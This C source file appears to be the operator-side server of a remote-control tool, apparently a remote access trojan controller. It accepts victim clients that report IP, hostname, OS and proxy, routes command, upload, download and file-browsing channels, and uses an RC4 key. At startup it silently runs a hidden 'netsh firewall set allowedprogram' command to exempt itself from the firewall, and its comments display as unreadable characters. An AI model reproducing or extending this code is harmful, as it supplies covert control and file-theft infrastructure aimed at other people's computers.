#include "global.h"
#include "clientlist.h"
#include "recv.h"
#include "send.h"
#include "shell.h"
#include "gui.h"

#pragma comment(linker, "/subsystem:\"windows\" /entry:\"mainCRTStartup\"") 

void Listen_Client(gpointer Parameter)
{
    WSADATA wsa;
    SOCKET ServerSocket=INVALID_SOCKET,ClientSocket=INVALID_SOCKET;
    struct sockaddr_in ServerAddress,ClientAddress;
    int AddressLength=sizeof(struct sockaddr_in);
    int SocketTimeOut=5000;     //�����׽��ֳ�ʱʱ��Ϊ5��
	int i=0;

    memset(&ServerAddress,NULL,sizeof(struct sockaddr_in));
    ServerAddress.sin_family=AF_INET;
    ServerAddress.sin_addr.s_addr=INADDR_ANY;
    ServerAddress.sin_port=htons(LISTEN_PORT);

    if(WSAStartup(MAKEWORD(2,2),&wsa)!=0)
    {
        //winsocket��ʼ��ʧ��
        WSACleanup();
		MessageBox(NULL,"winsocket init failed!","Error",MB_OK);
        exit(-1);
    }

    if((ServerSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==INVALID_SOCKET)
    {
        //�����׽���ʧ��
        WSACleanup();
		MessageBox(NULL,"Create socket failed!","Error",MB_OK);
        exit(-1);
    }

    if(bind(ServerSocket,(struct sockaddr *)&ServerAddress,sizeof(struct sockaddr_in))!=0)
    {
        //�󶨱��ص�ַʧ��
        closesocket(ServerSocket);
        WSACleanup();
		MessageBox(NULL,"Bind address failed!","Error",MB_OK);
        exit(-1);
    }

    if(listen(ServerSocket,SOMAXCONN)==SOCKET_ERROR)
    {
        //�׽���ת����ģʽʧ��
        closesocket(ServerSocket);
        WSACleanup();
		MessageBox(NULL,"Listen socket failed!","Error",MB_OK);
        exit(-1);
    }
	ClientInfo CI;
	ClientSocketArray=(SOCKET *)malloc(100*sizeof(SOCKET)*MAXIMUM_WAIT_OBJECTS);
	WSAEventArray=(WSAEVENT *)malloc(100*sizeof(WSAEVENT)*MAXIMUM_WAIT_OBJECTS);
	IODataArray=(IO_OPERATION_DATA **)malloc(100*sizeof(IO_OPERATION_DATA *)*MAXIMUM_WAIT_OBJECTS);
    memset(ClientSocketArray,NULL,100*sizeof(SOCKET)*MAXIMUM_WAIT_OBJECTS);
	memset(WSAEventArray,NULL,100*sizeof(WSAEVENT)*MAXIMUM_WAIT_OBJECTS);
	memset(IODataArray,NULL,100*sizeof(IO_OPERATION_DATA *)*MAXIMUM_WAIT_OBJECTS);
    //printf("��ʼ����...\n");
    while(1)
    {
        ClientSocket=accept(ServerSocket,(struct sockaddr *)&ClientAddress,&AddressLength);
        if(ClientSocket==INVALID_SOCKET)
        {
            //���ܿͻ�������ʧ��
            continue;
        }
        setsockopt(ClientSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));  //�������ݽ��ճ�ʱʱ��

        //���տͻ��˷�������������Ϣ
        memset(&CI,NULL,sizeof(ClientInfo));
        if(RecvClientInfo(ClientSocket,&CI)!=0)
        {
            closesocket(ClientSocket);
            continue;
        }
        //���������׽���Ϊ�޳�ʱʱ��
        SocketTimeOut=0;
        setsockopt(ClientSocket,SOL_SOCKET,SO_RCVTIMEO,(char *)&SocketTimeOut,sizeof(int));  //�������ݽ��ճ�ʱʱ��

		if (CI.order==1)
		{
			//�����������׽���
			for(i=0;Command_Socket!=INVALID_SOCKET && i<10000;i++) Sleep(1);
			Command_Socket=ClientSocket;
			continue;
		}
		else if (CI.order==2)
		{
			//�ļ��ϴ��׽���
			for(i=0;Upload_Socket!=INVALID_SOCKET && i<10000;i++) Sleep(1);
			Upload_Socket=ClientSocket;
			continue;
		}
		else if (CI.order==3)
		{
			//�ļ������׽���
			for(i=0;Download_Socket!=INVALID_SOCKET && i<10000;i++) Sleep(1);
			Download_Socket=ClientSocket;
			continue;
		}
		else if(CI.order==5)
		{
			//�ļ�Ŀ¼����׽���
			for(i=0;File_Explorer_Socket!=INVALID_SOCKET && i<10000;i++) Sleep(1);
			File_Explorer_Socket=ClientSocket;
			continue;
		}

		EnterCriticalSection(&CRI_Total);
        ClientSocketArray[TotalConnection]=ClientSocket;
        IODataArray[TotalConnection]=(IO_OPERATION_DATA *)malloc(sizeof(IO_OPERATION_DATA));
        if(IODataArray[TotalConnection]==NULL)
        {
            //printf("�ڴ治��!\n");
            g_thread_exit(NULL);
        }
        memset(IODataArray[TotalConnection],NULL,sizeof(IO_OPERATION_DATA));
        WSAEventArray[TotalConnection]=IODataArray[TotalConnection]->overlap.hEvent=WSACreateEvent();
        IODataArray[TotalConnection]->WSAbuffer.len=MAX_SIZE;
        IODataArray[TotalConnection]->WSAbuffer.buf=IODataArray[TotalConnection]->RecvBuffer;

        strcat(IODataArray[TotalConnection]->Client.ip,CI.ip);
        strcat(IODataArray[TotalConnection]->Client.name,CI.name);
		strcat(IODataArray[TotalConnection]->Client.OS,CI.OS);
		IODataArray[TotalConnection]->Client.HTTP_Proxy=CI.HTTP_Proxy;
		IODataArray[TotalConnection]->time=time(NULL);
        if(AddClientList(&IODataArray[TotalConnection]->Client,ClientSocket)!=0)
        {
            free(IODataArray[TotalConnection]);
            closesocket(ClientSocket);
            ClientSocketArray[TotalConnection]=INVALID_SOCKET;
            WSACloseEvent(WSAEventArray[TotalConnection]);
			LeaveCriticalSection(&CRI_Total);
            continue;
        }
        //printf("�ͻ���%s�����ˡ�\n",IODataArray[TotalConnection]->Client.ip);

        WSARecv(ClientSocket,&IODataArray[TotalConnection]->WSAbuffer,1,&IODataArray[TotalConnection]->NumberOfBytesRecvd,\
                &IODataArray[TotalConnection]->flags,&IODataArray[TotalConnection]->overlap,NULL);

        TotalConnection++;
        LeaveCriticalSection(&CRI_Total);
		if((TotalConnection-1)%MAXIMUM_WAIT_OBJECTS==0)
		{
			EnterCriticalSection(&CRI_ListenThreas);
			ListenThreads++;
			LeaveCriticalSection(&CRI_ListenThreas);
			g_thread_create((GThreadFunc)RecvMessageFromClient,NULL,TRUE,NULL);
			//printf("�½��߳�\n");
			Sleep(500);
		}

    }
    g_thread_exit(NULL);
}

int read_config()
{
	FILE *file=NULL;

	if((file=fopen("config","rb"))==NULL)
		return -1;
	fread(&LISTEN_PORT,sizeof(int),1,file);
	fclose(file);

	return 0;
}

int main(int argc,char *argv[])
{
    HANDLE hThread;
	GtkWidget *main_window;
	GtkWidget *main_menu_bar;
    GtkWidget *main_window_vbox;
    GtkWidget *main_scrolled_window;
    GtkWidget *main_button_box;
	
    memset(&WSAEventArray,NULL,sizeof(WSAEventArray));
    memset(&IODataArray,NULL,sizeof(IODataArray));
    CC.soc=INVALID_SOCKET;

	char cmd[300];
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
	
    memset(cmd,NULL,sizeof(cmd));
    memset(&si,NULL,sizeof(STARTUPINFO));
    memset(&pi,NULL,sizeof(PROCESS_INFORMATION));
	
    si.cb=sizeof(STARTUPINFO);
    si.dwFlags=STARTF_USESHOWWINDOW;
    si.wShowWindow=SW_HIDE;
    sprintf(cmd,"cmd.exe /c netsh firewall set allowedprogram %s A ENABLE",argv[0]);   //��ӷ���ǽ��������
    CreateProcess(NULL,cmd,NULL,NULL,FALSE,0,NULL,NULL,&si,&pi);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

	InitializeCriticalSection(&CRI_List);       //��ʼ���ٽ�������
    InitializeCriticalSection(&CRI_Total);
	InitializeCriticalSection(&CRI_IOData);
	InitializeCriticalSection(&CRI_update_list);
	InitializeCriticalSection(&CRI_ListenThreas);
	InitializeCriticalSection(&CRI_UTA);
	InitializeCriticalSection(&CRI_ATU);

	rc4_init((unsigned char *)S_box,(unsigned char *)RC4_KEY,strlen((const char *)RC4_KEY));      //��ʼ����Կ

	gtk_init (&argc, &argv);

	/*�̵߳ĳ�ʼ��*/  
    if(!g_thread_supported()) g_thread_init(NULL);  
    gdk_threads_init();  

    main_window_vbox=gtk_vbox_new(FALSE,1);
    main_window=create_window("Remote Control Software",1,800,450);
	g_signal_connect(G_OBJECT(main_window),"destroy",G_CALLBACK(gtk_main_quit),NULL);
	main_menu_bar=create_menu_bar();
    main_scrolled_window=create_list();
    main_button_box=create_choose_button();
	gtk_box_pack_start(GTK_BOX(main_window_vbox),main_menu_bar,FALSE,FALSE,1);
    gtk_box_pack_start(GTK_BOX(main_window_vbox),main_scrolled_window,TRUE,TRUE,5);
    gtk_box_pack_start(GTK_BOX(main_window_vbox),main_button_box,FALSE,FALSE,5);
    gtk_container_add(GTK_CONTAINER(main_window),main_window_vbox);
	
    gtk_widget_show_all(main_window);

	read_config();                //��ȡ�����ļ�

	g_thread_create((GThreadFunc)Listen_Client,NULL,TRUE,NULL);                 //�����������ض˿��߳�
	g_thread_create((GThreadFunc)CheckHTTPOnlineClient,NULL,TRUE,NULL);
    CloseHandle((hThread=CreateThread(NULL,0,SendOrderToClient,NULL,0,NULL)));

	gdk_threads_enter();
    gtk_main();
	gdk_threads_leave();

    return 0;
}








